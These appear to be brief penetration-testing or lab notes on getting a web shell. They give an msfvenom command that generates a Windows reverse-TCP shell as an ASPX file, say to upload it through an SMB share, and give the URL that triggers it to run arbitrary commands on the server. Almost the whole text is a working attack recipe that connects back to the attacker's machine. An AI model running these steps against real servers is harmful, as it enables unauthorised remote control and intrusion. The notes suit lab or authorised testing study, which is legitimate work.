
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your IP> LPORT=8080 -f aspx -o shell.aspx

SMB PORT: 49663 - execute arbitrary code/commands  

http://ip:49663/smbfolder/shell.aspx    -smbfolder is the folder in which we upload shell.aspx using "put shell.exe" via smbclient


Web Shell Access: Attackers or testers upload an .aspx file to a vulnerable web server to establish a "web shell". Once uploaded to a web-accessible directory, the attacker can visit the URL (e.g., target.com) to 
execute arbitrary commands on the server.
